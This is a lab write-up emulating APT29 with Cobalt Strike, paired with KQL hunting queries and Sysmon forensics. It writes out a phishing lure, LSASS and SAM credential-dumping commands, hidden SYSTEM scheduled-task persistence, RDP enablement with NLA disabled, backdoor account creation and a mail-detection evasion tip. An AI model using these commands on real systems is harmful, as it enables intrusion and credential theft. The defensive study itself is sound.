![](/assets/img/posts/apt29-hunting/img-063.png)

### Body is

Hello, Please review the attached Salary Adjustment Form for 2025. Your digital signature is required before 12 Feb 2025.

To ensure document security, the file is delivered in a protected format. If prompted, click Enable Content to view the document.

Let me know if you have any questions.

Regards,

```
Mail Header:
Return-Path: hr.department@secure-docs-support.com
Received: from mail.secure-docs-support.com (mail.secure-docs-support.com
[185.83.121.44])
by mail.victim.local with ESMTPS id 123456789
for user@victim.local;
Tue, 11 Feb 2025 10:22:33 +0200
Subject: Updated Salary Adjustment Form - Action Required
From: HR Department hr.department@secure-docs-support.com
To: user@victim.local
Date: Tue, 11 Feb 2025 10:22:12 +0200
MIME-Version: 1.0
```

```
Message-ID: 20250211AHR-44321@mail.secure-docs-support.com
Content-Type: multipart/mixed; boundary="----=_Part_8848_9912413.1707643333002"
```

```
------=_Part_8848_9912413.1707643333002
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
```

Hello, Please review the attached Salary Adjustment Form for 2025. Your digital signature is required before 12 Feb 2025.

To ensure document security, the file is delivered in a protected format. If prompted, click Enable Content to view the document.

Let me know if you have any questions.

Regards, HR Compensation Team

```
------=_Part_8848_9912413.1707643333002
Content-Type: application/octet-stream; name="Salary_Adjustment.iso"
Content-Transfer-Encoding: base64
```

Content-Disposition: attachment; filename="Salary_Adjustment.iso"

```
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAA4fug4P////8BAAEAAA
AAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
[Truncated malicious ISO base64 for safety]
```

------=_Part_8848_9912413.1707643333002--

### Quick Checks

Check Received: chain

Identify spoofing

Validate domain → DKIM/SPF failures

Extract ISO base64

Decode it manually

Mount the ISO in your external VM

Analyze.lnk metadata

### Full Malware Analysis For Sample

> **Ref:** <https://mssplab.github.io/threat-hunting/2023/06/02/malware-analysis-apt29.html>

File Name: covenant.exe

File Hash:
287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc

File Size: 201KB

40/71 security vendors flagged this file as malicious

![](/assets/img/posts/apt29-hunting/img-064.png)

Sample URL: https://tria.ge/230613-s1dz9shc81

![](/assets/img/posts/apt29-hunting/img-065.png)

Now lets use pestudio to go further in this sample:

![](/assets/img/posts/apt29-hunting/img-066.png)

**File Header:**

```
 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00
00 00 00 40 00 00 00 00 00 00 00
```

Type: executable, 64-bit, GUI

**Entry Point:**

```
 48 83 EC 28 E8 D7 03 00 00 48 83 C4 28 E9 7A FE FF FF CC CC
40 53 48 83 EC 20 48 8B D9 33 C9 FF
```

**DOS Header:**

```
22AB96745BD7148270DAB3A859A3107FBFE34604E3B627D307CC6EC7847E
```

6C6F

### Imports

( This file is packed file, imports will not be a big deal here )

CreateTimerQueueTimer

TerminateProcess

GetCurrentProcess

WaitForSingleObject

CreateThread

GetEnvironmentStringsW

FindNextFileW

### Strings

\r\n\r\n \r\n \r\n \r\n \r\n \r\n \r\n \r\n\r\n

GetCommandLine xuzviqpds{cxdfklk

MS Shell Dlg

UpdateWindow

LoadIcon

![](/assets/img/posts/apt29-hunting/img-067.png)

![](/assets/img/posts/apt29-hunting/img-068.png)

![](/assets/img/posts/apt29-hunting/img-069.png)

Why it sound clean from strings and import:

This behavior is typical of APT29 / Cozy Bear loaders. It is not:

a Word macro a PowerShell script a Cobalt Strike beacon or a Covenant “grunt”

It is a low-level loader/injector.

This is the most important concept to understand.

### Minimal Imports

The reason you only see common WinAPI imports (GetCommandLine, HeapAlloc, etc.) is because the attacker uses API hashing.

Instead of importing functions like:

VirtualAlloc

CreateRemoteThread

WriteProcessMemory

VirtualProtect

CreateProcess

Etc.

…the loader calculates the hash of each API name at runtime, resolves it dynamically, and then calls the function by pointer.

This has two effects:

1. Static scanners do not see suspicious APIs.

2. Analysts looking at imports see a harmless-looking executable.

This technique is heavily documented in NSA’s public reports on APT29.

Strange / Random Strings

The strings you saw:

D$E3 LSHH3 htJ |SHH T50H 5Eu...

These are not real meaningful strings.

They are pieces of an encrypted payload blob, usually encrypted through:

XOR loops

ADD/SUB transformations rolling ciphers

The decrypted payload does not exist in the file statically. It exists only in memory after the loader runs.

This is why you do not see:

URLs domains

PowerShell commands configuration data cryptographic keys

All of that is hidden inside the encrypted blob.

### Core Behavior of the Loader

Based on the public analysis, the loader does the following:

Calls CreateTimerQueueTimer

This is not normal scheduling. APT29 uses it for:

delayed execution anti-debugging anti-sandbox (sandboxes often kill samples that “sleep too long”)

Decrypts the embedded payload: Inside sections such as:

.rdata

.data custom sections or inside the PE resources

The loader extracts, decrypts, and prepares the next stage.

Resolves APIs dynamically

After decrypting the shellcode, it resolves functions such as:

LoadLibraryA

GetProcAddress

VirtualAlloc

VirtualProtect

CreateThread

These appear only during runtime, not in static imports.

Performs injection

It typically injects into:

its own process (self-injection, stealthy), or a newly spawned hollowed process

This behavior is characteristic of APT29 loaders.

Executes the Stage-1 Payload

Once injected, the Stage-1 component begins the real work:

backdoor functionality

C2 communication persistence lateral movement

This is where the operation truly begins.

How the deploy will go?

Let create a payload with cobalt strike

It will be connected with a previous listener i already made

![](/assets/img/posts/apt29-hunting/img-070.png)

![](/assets/img/posts/apt29-hunting/img-071.png)

![](/assets/img/posts/apt29-hunting/img-072.png)

![](/assets/img/posts/apt29-hunting/img-073.png)

it will be detected but u can bypass this by creating ur own mail server like Mailhok but i will not waste time here tbh

After Delivery and clicking the link victim will be connected directly in C2 tunnel

![](/assets/img/posts/apt29-hunting/img-074.png)

![](/assets/img/posts/apt29-hunting/img-075.png)

![](/assets/img/posts/apt29-hunting/img-076.png)

![](/assets/img/posts/apt29-hunting/img-077.png)

and now the tunnel is up we can open an interactive session and re-name the file to avoid any further detections "[12/02 10:22:40] beacon> powershell Rename-Item "C:\Users\Victim- Machine\Desktop" "OneDrive.exe""

![](/assets/img/posts/apt29-hunting/img-078.png)

![](/assets/img/posts/apt29-hunting/img-079.png)

![](/assets/img/posts/apt29-hunting/img-080.png)

### KQL for hunting

```
DeviceFileEvents
| where FolderPath endswith @"\Desktop"
| where FileName contains "Attack" or FileName contains "Update" or FileName endswith
".hta" or FileName endswith ".exe"
```

```
DeviceProcessEvents
| where InitiatingProcessFileName in ("explorer.exe", "outlook.exe")
| where FileName endswith ".hta" or FileName endswith ".exe"
```

```
DeviceProcessEvents
| where InitiatingProcessFileName == "mshta.exe"
```

| where FileName == "powershell.exe" or FileName == "pwsh.exe"

## T1059.001 "Command and Scripting Interpreter: PowerShell

Cozy Bear makes heavy use of PowerShell to run commands and retrieve malicious payloads on compromised systems. Their operators frequently obfuscate or encode PowerShell instructions to evade EDR controls and minimize detection. PowerShell is also commonly used to fetch additional payloads from remote servers or execute scripts that support lateral movement inside the network. Moreover, the group often combines PowerShell with other living-off-the-land techniques (LOLBins) to blend their activity with legitimate system processes and further reduce visibility

> **Ref:** <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques?utm_source=chatgpt.com#indicators-of-compromise-(iocs>

In November 2018, FireEye detected a targeted phishing campaign affecting multiple industries including defense, law enforcement, media, pharmaceuticals, think tanks, and the U.S. public sector. The emails impersonated the U.S. Department of State and delivered malicious Windows shortcut (LNK) files inside ZIP archives. The LNK files executed Cobalt Strike Beacon, a post-exploitation framework, along with benign decoy documents.

Technical analysis and historical similarities suggest the campaign is likely linked to APT29, a Russian-state-affiliated threat group known for sophisticated espionage. APT29 is known to quickly abandon phishing implants after initial compromise.

### Key Features of the Campaign

Phishing Infrastructure

Emails came from likely compromised legitimate servers (e.g., a hospital).

Links pointed to ZIP files hosted on compromised domains like jmj[.]com.

Emails appeared as official Department of State communications, using publicly available forms (ds7002.pdf) as decoys.

Malware Delivery

ZIP archives contained:

Malicious LNK file: ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c)

Decoy document: ds7002.pdf (benign)

The LNK executed an obfuscated PowerShell command that:

Extracted embedded content from the LNK.

Base64-decoded it.

Ran the Cobalt Strike Beacon DLL ( cyzfc.dat ).

The DLL was executed using rundll32.exe via the export function

PointFunctionCall.

Command and Control (C2)

The Beacon payload communicated with pandorasong[.]com over HTTPS (port 443), using a modified Pandora Malleable C2 profile to evade detection.

Configured for process injection into rundll32.exe and included custom HTTP headers and user-agent strings to mimic legitimate traffic.

### Operational Timeline

Infrastructure registration and setup began ~30 days before the campaign.

Key dates:

Oct 15, 2018: C2 domain registered and SSL certificate issued.

Nov 2, 2018: LNK weaponized.

Nov 14, 2018: First phishing emails sent.

### Similarities to 2016 Campaign

LNK structure and metadata, including MAC address of the system used to build the file.

PowerShell loader functions and obfuscation methods.

Targeting patterns and specific recipients.

Main difference: 2018 campaign used Cobalt Strike rather than custom malware.

### Indicators of Compromise (IoCs)

Phishing Email: DOSOneDriveNotifications-svCT-Mailbox…

@northshorehealthgm[.]org

Malware Hosting: https://www.jmj[.]com/personal/nauerthn_state_gov/*

C2 Domain: pandorasong[.]com → 95.216.59[.]92

Malicious Files:

ds7002.zip (MD5: 3fccf531ff0ae6fedd7c586774b17a2d)

ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c)

cyzfc.dat (MD5: 16bbc967a8b6a365871a05c74a4f345b)

Decoy File: ds7002.pdf (MD5: 313f4808aa2a2073005d219bc68971cd)

### FireEye Detection

The campaign was detected across FireEye products, flagged as:

Malware.Archive

Malware.Binary.lnk

Suspicious.Backdoor.Beacon

SUSPICIOUS POWERSHELL USAGE

Structured Threat Reputation hits for IPs, domains, and file hashes.

### Implications

The activity shows APT29-level sophistication, particularly in infrastructure preparation, obfuscation, and phishing tactics.

Network defenders should focus on full compromise scope investigation, regardless of confirmed APT29 attribution.

Organizations previously targeted by APT29 should be particularly vigilant for similar phishing and post-exploitation activity.

> **Ref:** <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign?utm_source=chatgpt.com>

### Technical Side

We will skip mail delivery section, it already done b4, now we want to do the following

Create DLL Beacon

Send it to Victim

Use it to run powershell commands

We will use encoded powershell command to run rundll32.exe on our beacon i already made the beacon

![](/assets/img/posts/apt29-hunting/img-081.png)

![](/assets/img/posts/apt29-hunting/img-082.png)

Lets open this DLL and start our beacon "rundll32 C:\Users\Victim- Machine\Desktop\APT29.dll,StartW"

![](/assets/img/posts/apt29-hunting/img-083.png)

Now from beacon interact portal lets do our powershell commands:

![](/assets/img/posts/apt29-hunting/img-084.png)

### Enumeration List Found

powershell Get-WmiObject Win32_ComputerSystem powershell Get-WmiObject Win32_OperatingSystem powershell [Environment]::OSVersion powershell systeminfo powershell whoami /all powershell Get-LocalUser powershell net user powershell net localgroup administrators powershell Get-NetIPAddress powershell Get-NetRoute powershell Get-NetTCPConnection powershell arp -a powershell reg save HKLM\SAM C:\Users\Public\SAM powershell reg save HKLM\SYSTEM C:\Users\Public\SYSTEM powershell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full

![](/assets/img/posts/apt29-hunting/img-085.png)

![](/assets/img/posts/apt29-hunting/img-086.png)

![](/assets/img/posts/apt29-hunting/img-087.png)

**KQL for Hunting:**

```
DeviceProcessEvents
```

| where FileName ==~ "powershell.exe"

| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden")

or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"

or ProcessCommandLine contains "FromBase64String"

| join kind=leftouter (

DeviceNetworkEvents

| where InitiatingProcessFileName ==~ "powershell.exe"

| project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine

) on DeviceId

| project Timestamp, DeviceName, ProcessCommandLine, RemoteIP, RemotePort

## T1053.005 "Scheduled Task/Job: Scheduled Task"

Cozy Bear frequently leverages Windows Scheduled Tasks as a persistence mechanism, enabling the execution of malicious scripts or programs at specific times or intervals. By creating or altering scheduled tasks on compromised systems, they can repeatedly run their payloads without any user interaction, making detection significantly more difficult.

A common approach involves creating a task with an innocuous name like "System Update", configured to launch a PowerShell script every hour for C2 communication, data exfiltration, or fetching additional instructions. For example:

```
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -ExecutionPolicy
```

Bypass -File C:\path\to\script.ps1" /sc hourly

Cozy Bear may further modify task settings to resemble legitimate system maintenance or use randomized intervals to avoid generating predictable patterns that security tools could flag. Scheduled tasks offer a flexible and reliable persistence method, as they can be easily updated, disabled, or removed remotely, allowing Cozy Bear to maintain or adjust their access without drawing attention.

APT29 used scheduler and schtasks to create new tasks on remote hosts as part of lateral movement. They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion. They previously used named and hijacked scheduled tasks to also establish persistence.

https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing- campaigns https://cyber-kill-chain.ch/techniques/T1053/005/

APT29 often enhances stealth by:

Randomizing execution intervals (triggering every 47–93 minutes) to avoid detection based on predictable patterns.

Using hidden or minimally privileged accounts to run scheduled tasks, reducing visibility and reducing the chance of privilege‑based alerting.

Leveraging encoded or obfuscated PowerShell commands, ensuring that the malicious logic is not easily readable.

Using “AtLogon” or “OnStartup” triggers, ensuring persistence even after system reboots or user sessions restart.

Configuring tasks to run whether the user is logged in or not, with stored credentials if necessary.

Disguising tasks to mimic vendor or operating system maintenance jobs, blending seamlessly with existing scheduled operations.

Furthermore, Cozy Bear may modify or disable scheduled tasks on‑the‑fly to adjust their operational tempo. Tasks can be remotely:

Modified using schtasks /change

Disabled using schtasks /change /disable

Deleted using schtasks /delete

### Simulation Section

I will use beacon which used in T1059.001 "APT29.dll"

Lets try to upload ps file by this beacon

I used chatgpt to create quick ps file

Create file called update_log.txt

Each time script run will add the timestamp

![](/assets/img/posts/apt29-hunting/img-088.png)

Created on /home/kali/Desktop

![](/assets/img/posts/apt29-hunting/img-089.png)

Lets upload from C2 instance dll file beacon> cd C:\Users\Victim-Machine\Desktop\ upload /home/kali/Desktop/APT-shtask.ps1

![](/assets/img/posts/apt29-hunting/img-090.png)

We will try to create schedule task by powershell commands (encoded and plain)

```
Plain command " schtasks /create /tn "SystemUpdate" /tr "powershell.exe -
```

NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\Victim- Machine\Desktop\APT-shtask.ps1" /sc hourly /ru SYSTEM "

Lets deploy it as a sh-task

To do it u need first SYSTEM Privilege

If U Used getuid in beacon it will give "You are DESKTOP-M8AP5P7\Victim-Machine"

![](/assets/img/posts/apt29-hunting/img-091.png)

So now our goal is to escalate our privileges

Lets run this command to check which privileges this user in powershell whoami /groups execute whoami /groups

![](/assets/img/posts/apt29-hunting/img-092.png)

The user is in the Administrators group but marked as Deny Only, which means:

The user is not actually an Administrator.

The session is not elevated.

You cannot use /ru SYSTEM.

You cannot perform strong persistence techniques like APT29 until you do Privilege Escalation.

And this is completely normal on Windows 10.

Here we have 3 options to go with:

Run schedule task with local user access powershell schtasks /create /tn "UserUpdate" /tr "powershell.exe - NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /f (will do the needed but still no high privilege)

Run the beacon as Admin (we will use this to avoid wasting time as we don't talk about privilege escalation)

![](/assets/img/posts/apt29-hunting/img-093.png)

![](/assets/img/posts/apt29-hunting/img-094.png)

![](/assets/img/posts/apt29-hunting/img-095.png)

![](/assets/img/posts/apt29-hunting/img-096.png)

Lets create the sh-task now: powershell schtasks /create /tn

SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden - ExecutionPolicy Bypass -File C:\\Users\\Victim-Machine\\Desktop\\APT- shtask.ps1" /sc hourly /ru SYSTEM /f

![](/assets/img/posts/apt29-hunting/img-097.png)

"SUCCESS: The scheduled task "SystemUpdate" has successfully been created."

Run other Process as Admin and steal the token from it "uac-token- duplication"

Failed. Tried 0 process tokens => no process have an admin token

You should scan which process run with high privilege, you can use ps command in beacon

![](/assets/img/posts/apt29-hunting/img-098.png)

![](/assets/img/posts/apt29-hunting/img-099.png)

Run in hidden style legit name

Trigger each hour

Run as SYSTEM User

**KQL for Hunting:**

```
DeviceEvents
| where ActionType == "ScheduledTaskCreated"
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```

```
DeviceEvents
| where ActionType == "ScheduledTaskCreated"
or ActionType == "ScheduledTaskUpdated"
| where AdditionalFields contains "powershell.exe"
| project Timestamp, DeviceName, AccountName, AdditionalFields
```

```
DeviceEvents
| where ActionType =~ "ScheduledTaskCreated"
| where AdditionalFields contains "SystemUpdate"
or AdditionalFields contains "Update"
or AdditionalFields contains "Maintenance"
| project Timestamp, DeviceName, AccountName, AdditionalFields
```

## T1021.001 "Remote Services: Remote Desktop Protocol"

Remote Desktop Protocol (RDP) is a native Windows remote administration service commonly abused by threat actors to achieve lateral movement and full interactive access inside compromised environments.

APT29 (Cozy Bear / The Dukes), a highly sophisticated state-sponsored threat group, is known for leveraging valid credentials and built‑in Windows remote services to blend in with legitimate administrative activity.

APT29 avoids noisy brute‑force techniques and instead focuses on obtaining valid domain credentials through credential dumping (LSASS access), Kerberoasting, or abuse of OAuth tokens. After acquiring legitimate accounts, the group performs stealthy lateral movement using RDP to pivot deeper inside the network.

### Simulation Section

First lets open RDP Service and Open FW as they always do powershell reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f powershell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes shell reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

![](/assets/img/posts/apt29-hunting/img-100.png)

![](/assets/img/posts/apt29-hunting/img-101.png)

Now lets create a user to make it more clear in forensics section

User Name: APT29

Password: m*

![](/assets/img/posts/apt29-hunting/img-102.png)

![](/assets/img/posts/apt29-hunting/img-103.png)

Came as an Admin for Beacon we ran as an admin previously lets open RDP protocol:

shell netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389

![](/assets/img/posts/apt29-hunting/img-104.png)

Lets disable NLA to avoid any security noisy while logging from Kail shell reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

![](/assets/img/posts/apt29-hunting/img-105.png)

Add user to RDP Users list:

shell net localgroup "Remote Desktop Users" APT29 /add

![](/assets/img/posts/apt29-hunting/img-106.png)

![](/assets/img/posts/apt29-hunting/img-107.png)

![](/assets/img/posts/apt29-hunting/img-108.png)

The waited moment, its RDP connection

I will use xfreerdp3 built in kali tool xfreerdp3 /f /u:APT29 /p##### /v:192.168.253.147

![](/assets/img/posts/apt29-hunting/img-109.png)

And here we are :)

![](/assets/img/posts/apt29-hunting/img-110.png)

![](/assets/img/posts/apt29-hunting/img-111.png)

![](/assets/img/posts/apt29-hunting/img-112.png)

![](/assets/img/posts/apt29-hunting/img-113.png)

## T1003.001 "OS Credential Dumping: LSASS Memory*

One of the most critical stages in the APT29 attack chain involves harvesting authentication material directly from the Local Security Authority Subsystem Service (LSASS). By dumping LSASS memory, the actor gains access to cached credentials, NTLM hashes, Kerberos tickets, and tokens—enabling lateral movement, privilege escalation, and long‑term persistence inside the environment.

APT29 is known for leveraging multiple LSASS dumping techniques depending on the level of stealth required. In our simulation, we replicated their workflow using Cobalt Strike, focusing on low‑noise methods consistent with real‑world tradecraft.

Once the attacker obtains a high‑integrity foothold on the compromised host, LSASS dumping is performed through controlled memory extraction. Common approaches include:

Using Cobalt Strike’s built‑in procdump module.

Triggering a dump through rundll32.exe loading comsvcs.dll (often observed in APT29 operations).

Employing stealthy tools such as NanoDump to bypass EDR and ETW monitoring.

### Simulation Section

First make sure ur beacon is in High Integrity as always lets try getuid:

![](/assets/img/posts/apt29-hunting/img-114.png)

no we want to dump the credentials from lsass.exe process first lets find it on the machine using ps command

![](/assets/img/posts/apt29-hunting/img-115.png)

![](/assets/img/posts/apt29-hunting/img-116.png)

![](/assets/img/posts/apt29-hunting/img-117.png)

![](/assets/img/posts/apt29-hunting/img-118.png)

APT29 was using a method called (rundll32.exe > comsvcs.dll)

File Path: C:\Windows\System32\comsvcs.dll

![](/assets/img/posts/apt29-hunting/img-119.png)

will use rundll32.exe to apply Living Off The Land comsvcs.dll (COM+ Services DLL)

This dll has a function called MiniDump which can be used to dump any process memory

It used officially by Microsoft for debugging

MiniDump converts any process memory to dump files

Native Code lsass.exe protected by multiple functions:

SeDebugPrivilege

SeAssignPrimaryTokenPrivilege

SeTcbPrivilege so here admin will not be enough, here we need SYSTEM access

![](/assets/img/posts/apt29-hunting/img-120.png)

I will dump the hashes and run mimikatz directly from cobalt strike to save time

![](/assets/img/posts/apt29-hunting/img-121.png)

![](/assets/img/posts/apt29-hunting/img-122.png)

![](/assets/img/posts/apt29-hunting/img-123.png)

![](/assets/img/posts/apt29-hunting/img-124.png)

![](/assets/img/posts/apt29-hunting/img-125.png)

will continue cracking steps also later

## T1071.001 "Application Layer Protocol: Web Protocols"

APT29 extensively leverages HTTP and HTTPS (T1071.001) to establish covert Command-and-Control channels. Their web traffic is intentionally crafted to resemble legitimate browser communications by using realistic User-Agent headers, encrypted payloads within standard HTTP fields, and benign-looking URL structures.

The group often uses cloud services such as GitHub and Dropbox as relays for C2 tasking and exfiltration. APT29 also employs beacon jitter and randomized timing to avoid behavioral detection, making their web-based C2 channels exceptionally difficult for defenders to identify

Covert C2 over HTTPS

APT29 regularly uses HTTPS (port 443) for encrypted communication, which hides:

Tasking instructions

Beacon metadata

Exfiltrated data

Because HTTPS encrypts the payload, defenders cannot inspect the contents.

APT29 makes their C2 traffic visually identical to normal browser traffic:

Realistic paths:

/favicon.ico

/login/validate

/update

/wp-content/uploads/

Legitimate-looking domains:

Often mimic cloud services or corporate websites

Sometimes use compromised servers with valid HTTPS certificates

Common HTTP methods:

GET for retrieving commands

POST for returning results or stolen data

HEAD/OPTIONS for keep-alive or health checks

APT29 embeds C2 messages inside HTTP headers to avoid payload inspection.

Common patterns seen in past operations:

Cookie: exfiltrated/encrypted data

User-Agent: identifies the malware version

X-Session-ID: beacon ID

Authorization: session keys

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Cookie: sessionId=gh4j2k1… ; data=base64_payload

Browser-like traffic originating from non-browser processes

Examples:

rundll32.exe wermgr.exe powershell.exe msbuild.exe svchost.exe not associated with web service roles

### Simulation Section

Lets create new listener over HTTPS (443)

![](/assets/img/posts/apt29-hunting/img-126.png)

will create the payload with same name of MITRE ID "T1071.001"

![](/assets/img/posts/apt29-hunting/img-127.png)

![](/assets/img/posts/apt29-hunting/img-128.png)

click on the listener then choose "Browser Pivot"

![](/assets/img/posts/apt29-hunting/img-129.png)

Will find the following

![](/assets/img/posts/apt29-hunting/img-130.png)

![](/assets/img/posts/apt29-hunting/img-131.png)

Now the victim's traffic will flow in the proxy :)

When performing web attacks through Cobalt Strike, it's important to understand the distinction between actions performed directly from the Beacon and those executed through a Browser Pivot. A Beacon can issue raw HTTP requests, such as GET, POST, and file uploads or downloads, which makes it useful for tasks like basic reconnaissance, HTTP‑based scanning, and covert data exfiltration. However, a Beacon cannot render webpages, execute JavaScript, or interact with the DOM, which means it cannot perform advanced web attacks on its own. In contrast, Browser Pivoting leverages the victim’s actual web browser (such as Edge or Firefox) and silently routes all of its traffic through the Beacon. This allows the operator to conduct full‑fledged web attacks using the victim’s authenticated session, including accessing internal web applications, stealing cookies or tokens, performing CSRF or JavaScript injections, and browsing internal portals that would otherwise be inaccessible. In short, the Beacon can generate low‑level web traffic, but Browser Pivoting unlocks full browser‑based attacks that require real session context, rendering capability, and user authentication.

Will use quick test (here we don't the attack on official web server so the results fail)

Check for http://target.local/ powershell Invoke-WebRequest http://target.local/

![](/assets/img/posts/apt29-hunting/img-132.png)

Run it in silent mode powershell "$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://target.local')"

Invoke-RestMethod (API Testing)

powershell Invoke-RestMethod -Uri "http://target.local/api"

Curl attempt run curl http://target.local/

![](/assets/img/posts/apt29-hunting/img-133.png)

powershell Invoke-WebRequest http://192.168.1.10/

![](/assets/img/posts/apt29-hunting/img-134.png)

The Intel471 article (Threat Hunting Case Study: Cozy Bear) clearly aligns with T1071.001 Web Protocols even if the article doesn’t explicitly mention the technique ID

The Intel471 report states that Cozy Bear uses:

HTTP-based command and control

HTTPS-based data exfiltration

Web request–based payload delivery

Indicators in the Intel471 report:

Repeated HTTP GET/POST to unusual endpoints with randomized URL paths.

Suspicious User-Agent strings, sometimes slightly off from default browser ones.

Small, frequent HTTPS POSTs that do not match normal web traffic volume patterns.

> **Ref:** <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>

Forensics Section:

First lets start with security events:

First lets extract these events files:

Security.evtx

C:\Windows\System32\winevt\Logs\Security.evtx

![](/assets/img/posts/apt29-hunting/img-135.png)

Operational.evtx

C:\Windows\System32\winevt\Logs\Microsoft-Windows- PowerShell%4Operational.evtx

![](/assets/img/posts/apt29-hunting/img-136.png)

Also i did the setup of sysmon previously, it will help us in:

Event ID 1: Process Create

Event ID 3: Network Connections

Event ID 7: Image Loaded (DLL beacon)

Event ID 11: File Create

Event ID 13: Registry Set

![](/assets/img/posts/apt29-hunting/img-137.png)

![](/assets/img/posts/apt29-hunting/img-138.png)

Lets start with Sysmon:

Will start with Event ID 1 (Process Creation)

![](/assets/img/posts/apt29-hunting/img-139.png)

we will filter with "rundll32.exe"

![](/assets/img/posts/apt29-hunting/img-140.png)

![](/assets/img/posts/apt29-hunting/img-141.png)

![](/assets/img/posts/apt29-hunting/img-142.png)

Then you will find event describes the following:

Initiated Process: rundll32.exe

Process Tree: 4344.exe > rundll32.exe

Process Path: C:\Users\Victim-Machine\Desktop\4344.exe ( C2 Beacon )

![](/assets/img/posts/apt29-hunting/img-143.png)

Also we can see DLL beacon file which came from DLL connections:

File: APT29.dll

File Path: C:\Users\Victim-Machine\Desktop\APT29.dll,StartW

CommandLine: rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW

Commands Done by this Dll:

PowerShell Encoding Attempts:

powershell -nop -exec bypass -EncodedCommand

RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA== powershell -nop -exec bypass -EncodedCommand

RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AG UAcgBTAHkAcwB0AGUAbQA= powershell -nop -exec bypass -EncodedCommand

RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwA= powershell -nop -exec bypass -EncodedCommand dwBoAG8AYQBtAGkA powershell -nop -exec bypass -EncodedCommand cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAIgBTAHkAcwB0AG

```
UAbQBVAHAAZABhAHQAZQAiACAALwB0AHIAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBl
AHgAZQAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQ
AgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIA
eQBwAGEAcwBzACAALQBGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXABWAGkAYwB0AG
kAbQAtAE0AYQBjAGgAaQBuAGUAXABEAGUAcwBrAHQAbwBwAFwAQQBQAFQALQBzAGgAdABh
AHMAawAuAHAAcwAxACIAIAAvAHMAYwAgAGgAbwB1AHIAbAB5ACAALwByAHUAIABTAFkAUw
BUAEUATQA=
```

powershell -nop -exec bypass -EncodedCommand

```
cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAUwB5AHMAdABlAG
0AVQBwAGQAYQB0AGUAIAAvAHQAcgAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABl
ACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASA
BpAGQAZABlAG4AIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAA
YQBzAHMAIAAtAEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAVgBpAGMAdABpAG
0ALQBNAGEAYwBoAGkAbgBlAFwAXABEAGUAcwBrAHQAbwBwAFwAXABBAFAAVAAtAHMAaAB0
AGEAcwBrAC4AcABzADEAIgAgAC8AcwBjACAAaABvAHUAcgBsAHkAIAAvAHIAdQAgAFMAWQ
BTAFQARQBNACAALwBmAA==
```

![](/assets/img/posts/apt29-hunting/img-144.png)

Attempt from APT.29 dll file to make the persistence:

C:\Windows\system32\cmd.exe /C upload /home/kali/Desktop/APT- shtask.ps1 (Upload Attempt From Kali)

C:\Users\Victim-Machine\Desktop\APT-shtask.ps1 (File Path)

Now lets go to powershell.exe

![](/assets/img/posts/apt29-hunting/img-145.png)

Here we can see a huge amount of all powershell commands used in our simulations of course parent will appear to be as powershell.exe, so here we will focus on Payload Data4 Section only:

![](/assets/img/posts/apt29-hunting/img-146.png)

Process Trees:

rundll32.exe > APT29.dll > powershell.exe (DLL Beacon)

